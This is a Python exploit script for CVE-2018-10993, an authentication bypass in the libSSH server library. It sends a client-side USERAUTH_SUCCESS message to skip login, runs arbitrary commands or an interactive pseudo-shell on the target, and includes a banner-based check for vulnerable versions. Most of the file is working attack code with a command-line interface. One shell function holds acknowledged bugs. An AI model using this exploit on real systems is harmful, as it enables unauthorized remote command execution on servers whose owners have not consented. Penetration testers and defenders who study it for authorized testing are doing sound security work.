#!/usr/bin/python3

#
# CVE-2018-10993 libSSH authentication bypass exploit
#
#   The libSSH library has flawed authentication/connection state-machine.
# Upon receiving from connecting client the MSG_USERAUTH_SUCCESS Message
# (as described in RFC4252, sec. 5.1.) which is an authentication response message
# that should be returned by the server itself (not accepted from client)
# the libSSH switches to successful post-authentication state. In such state,
# it impersonates connecting client as server's root user and begins executing
# delivered commands. 
#   This results in opening an authenticated remote-access channel
# without any authentication attempts (authentication bypass).
#
# Below exploit contains modified code taken from:
#   - https://github.com/leapsecurity/libssh-scanner
#
# Known issues:
#   - UnauthSSH.shell() function is not working:
#       I never got paramiko.Channel.invoke_shell() into working from custom
#       transport object. Therefore as a workaround - `UnauthSSH.parashell()` function
#       was implemented that substitutes original functionality of spawning shell.
#
# Requirements:
#   - paramiko
#
# Mariusz B. / mgeeky, <mb@binary-offensive.com>
#

import sys
import socket
import time
import argparse
from sys import argv, exit

try:
    import paramiko
except ImportError:
    print('[!] Paramiko required: python3 -m pip install paramiko')
    sys.exit(1)


VERSION = '0.1'

config = {
    'debug' : False,
    'verbose' : False,
    'host' : '',
    'port' : 22,
    'log' : '',
    'connection_timeout' : 5.0,
    'session_timeout' : 10.0,
    'buflen' : 4096,
    'command' : '',
    'shell' : False,
}

class Logger:
    @staticmethod
    def _out(x):
        if config['debug'] or config['verbose']:
            sys.stdout.write(x + '\n')

    @staticmethod
    def dbg(x):
        if config['debug']:
            sys.stdout.write('[dbg] ' + x + '\n')

    @staticmethod
    def out(x):
        Logger._out('[.] ' + x)

    @staticmethod
    def info(x):
        Logger._out('[?] ' + x)

    @staticmethod
    def err(x):
        sys.stdout.write('[!] ' + x + '\n')

    @staticmethod
    def fail(x):
        Logger._out('[-] ' + x)

    @staticmethod
    def ok(x):
        Logger._out('[+] ' + x)

class UnauthSSH():
    def __init__(self):
        self.host = config['host']
        self.port = config['port']
        self.sock = None
        self.transport = None
        self.connectionInfoOnce = False

    def __del__(self):
        if self.sock:
            self.sock.close()

    def sshAuthBypass(self, force = False):
        if not force and (self.transport and self.transport.is_active()):
            Logger.dbg('Returning already issued SSH Transport')
            return self.transport

        self.__del__()
        self.sock = socket.socket()

        if not self.connectionInfoOnce:
            self.connectionInfoOnce = True
            Logger.info('Connecting with {}:{} ...'.format(
                self.host, self.port
            ))

        try:
            self.sock.connect((str(self.host), int(self.port)))
            Logger.ok('Connected.')
        except Exception as e:
            Logger.fail('Could not connect to {}:{} . Exception: {}'.format(
                self.host, self.port, str(e)
            ))
            sys.exit(1)
        
        message = paramiko.message.Message()
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)

        transport = paramiko.transport.Transport(self.sock)
        transport.start_client(timeout = config['connection_timeout'])
        transport._send_message(message)

        self.transport = transport
        return transport

    def NOT_WORKING_shell(self):
        # FIXME: invoke_shell() closes channel prematurely.
        transport = self.sshAuthBypass()
        session = transport.open_session(timeout = config['session_timeout'])
        session.set_combine_stdLogger.err(True)
        session.get_pty()
        session.invoke_shell()

        username = UnauthSSH._send_recv(session, 'username')
        hostname = UnauthSSH._send_recv(session, 'hostname')

        prompt = '{}@{} $ '.format(username, hostname)

        while True:
            inp = input(prompt).strip()

            if inp.lower() in ['exit', 'quit'] or not inp:
                Logger.info('Quitting...')
                break

            out = UnauthSSH._send_recv(session, inp)
            if not out:
                Logger.err('Could not constitute stable shell.')
                return 

            print(out)

    def shell(self):
        self.parashell()

    def parashell(self):
        username = self.execute('whoami')
        hostname = self.execute('hostname')

        prompt = '{}@{} $ '.format(username, hostname)
    
        if not username or not hostname:
            Logger.fail('Could not obtain username ({}) and/or hostname ({})!'.format(
                username, hostname
            ))
            return

        Logger.info('Entering pseudo-shell...')
        while True:
            inp = input(prompt).strip()

            if inp.lower() in ['exit', 'quit'] or not inp:
                Logger.info('Quitting...')
                break

            out = self.execute(inp)
            if not out:
                Logger.err('Could not constitute stable shell.')
                return 

            print(out)
        

    # FIXME: Not used as NOT_WORKING_shell() is bugged.
    @staticmethod
    def _send_recv(session, cmd):
        out = ''
        session.send(cmd.strip() + '\n')

        MAX_TIMEOUT = config['session_timeout']
        timeout = 0.0
        
        while not session.exit_status_ready():
            time.sleep(0.1)
            timeout += 0.1

            if timeout > MAX_TIMEOUT:
                return None
            if session.recv_ready():
                out += session.recv(config['buflen']).decode()

            if session.recv_stderr_ready():
                out += session.recv_stdLogger.err(config['buflen']).decode()

        while session.recv_ready():
            out += session.recv_ready(config['buflen'])

        return out
        
    @staticmethod
    def _exec(session, inp):
        inp = inp.strip()

        Logger.dbg('Executing command: "{}"'.format(inp))
        session.exec_command(inp + '\n')
        
        retcode = session.recv_exit_status()
        buf = ''

        while session.recv_ready():
            buf += session.recv(config['buflen']).decode()

        buf = buf.strip()
        Logger.dbg('Returned:\n{}'.format(buf))
        return buf
    
    def execute(self, cmd, printout = False, tryAgain = False):
        transport = self.sshAuthBypass(force = tryAgain)
        session = transport.open_session(timeout = config['session_timeout'])
        session.set_combine_stderr(True)

        buf = ''
        try:
            buf = UnauthSSH._exec(session, cmd)
        except paramiko.SSHException as e:
            if 'channel closed' in str(e).lower() and not tryAgain:
                return self.execute(cmd, printout, True)

            if printout and not tryAgain:
                Logger.fail('Could not execute command ({}): "{}"'.format(cmd, str(e)))
            return ''

        if printout:
            print('\n{} $ {}'.format(self.host, cmd))
            print('{}'.format(buf))

        return buf

def exploit():
    handler = UnauthSSH()
    if config['command']:
        out = handler.execute(config['command'])
        Logger._out('\n$ {}'.format(config['command']))
        print(out)
    else:
        handler.shell()

def collectBanner():
    ip = config['host']
    port = config['port']

    try:
        s = socket.create_connection((ip, port), timeout = config['connection_timeout'])
        Logger.ok('Connected to the target: {}:{}'.format(ip, port))
        s.settimeout(None)
        banner = s.recv(config['buflen'])
        s.close()
        return banner.split(b"\n")[0]

    except (socket.timeout, socket.error) as e:
        Logger.fail('SSH connection timeout.')
        return ""

def check():
    global config
    if not config['command'] and not config['shell']:
        config['verbose'] = True

    banner = collectBanner()  
    
    if banner:
        Logger.info('Obtained banner: "{}"'.format(banner.decode().strip()))

        #
        # NOTICE: The below version-checking logic was taken from:
        #   - https://github.com/leapsecurity/libssh-scanner
        #

        if any(version in banner for version in [b"libssh-0.6", b"libssh_0.6"]):
            Logger.ok('Target seems to be VULNERABLE!')

        elif any(version in banner for version in [b"libssh-0.7", b"libssh_0.7"]):
            # libssh is 0.7.6 or greater (patched)
            if int(banner.split(b".")[-1]) >= 6:
                Logger.info('Target seems to be PATCHED.')
            else:
                Logger.ok('Target seems to be VULNERABLE!')
                return True

        elif any(version in banner for version in [b"libssh-0.8", b"libssh_0.8"]):
            # libssh is 0.8.4 or greater (patched)
            if int(banner.split(b".")[-1]) >= 4:
                Logger.info('Target seems to be PATCHED.')
            else:
                Logger.ok('Target seems to be VULNERABLE!')
                return True

        else:
            Logger.fail('Target is not vulnerable.')

    else:
        Logger.err('Could not obtain SSH service banner.')
        
    return False

def parse_opts():
    global config

    parser = argparse.ArgumentParser(description = 'If there was neither shell nor command option specified - exploit will switch to detect mode yielding vulnerable/not vulnerable flag.')
    parser.add_argument('host', help='Hostname/IP address that is running vulnerable libSSH server.')
    parser.add_argument('-p', '--port', help='libSSH port', default = 22)
    parser.add_argument('-s', '--shell', help='Exploit the vulnerability and spawn pseudo-shell', action='store_true', default = False)
    parser.add_argument('-c', '--command', help='Execute single command. ', default='')
    parser.add_argument('--logfile', help='Logfile to write paramiko connection logs', default = "")

    parser.add_argument('-v', '--verbose', action='store_true', help='Display verbose output.')
    parser.add_argument('-d', '--debug', action='store_true', help='Display debug output.')

    args = parser.parse_args()

    try:
        config['host'] = args.host
        config['port'] = args.port
        config['log'] = args.logfile
        config['command'] = args.command
        config['shell'] = args.shell
        config['verbose'] = args.verbose
        config['debug'] = args.debug

        if args.shell and args.command:
            Logger.err('Shell and command options are mutually exclusive!\n')
            raise Exception()

    except:
        parser.print_help()
        return False

    return True

def main():
    sys.stderr.write('''
    :: CVE-2018-10993 libSSH authentication bypass exploit.
    Tries to attack vulnerable libSSH libraries by accessing SSH server without prior authentication.
    Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
    v{}
    
'''.format(VERSION))
    if not parse_opts():
        return False

    if config['log']:
        paramiko.util.log_to_file(config['log'])

    check()

    if config['command'] or config['shell']:
        exploit()

if __name__ == '__main__':
    main()

